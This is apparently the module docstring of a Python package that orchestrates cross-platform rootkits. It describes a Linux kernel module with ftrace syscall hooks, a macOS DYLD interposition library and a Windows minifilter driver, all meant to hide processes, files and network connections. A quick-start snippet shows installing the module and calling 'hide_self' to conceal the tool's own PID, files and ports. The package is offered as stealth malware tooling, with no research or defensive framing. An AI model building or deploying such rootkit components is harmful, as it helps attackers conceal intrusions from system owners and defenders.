"""
Rootkit integration package — kernel-level hiding via native C modules.

Provides Python orchestration for platform-specific kernel modules:
  - **Linux**: Loadable Kernel Module (LKM) with ftrace syscall hooks
  - **macOS**: DYLD interposition library for readdir/process filtering
  - **Windows**: Filesystem minifilter driver for directory query filtering

The Python layer handles compilation, loading, ioctl communication,
and lifecycle management.  The native modules handle the actual
kernel-level hiding of processes, files, and network connections.

Quick start::

    from rootkit.manager import RootkitManager

    mgr = RootkitManager(config)
    mgr.install()      # compile + load native module
    mgr.hide_self()    # hide our PID, files, ports
    mgr.uninstall()    # unload + cleanup
"""
